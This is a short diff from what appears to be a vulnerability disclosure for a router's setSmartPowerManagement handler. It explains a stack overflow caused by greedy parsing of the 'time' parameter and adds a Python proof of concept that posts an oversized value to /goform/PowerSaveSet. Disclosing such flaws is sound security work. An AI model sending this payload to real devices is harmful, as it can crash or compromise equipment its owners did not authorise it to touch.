@@ -12,3 +12,12 @@ The function "setSmartPowerManagement" retrieves the parameter "time" using "sub
 This greedy matching mechanism is insecure, as it can cause a stack overflow if the size of the data we enter exceeds the sizes of "v10", "v9", "v8", or "v7".
 
 Recurring vulnerabilities and POC
+import requests
+ip = '192.168.2.3'
+url = f'http://{ip}/goform/PowerSaveSet'
+payload = {
+    "time": '1:00-1:'+'1'*0x500
+}
+res = requests.post(url=url, data=payload)
+print(res.content)
+
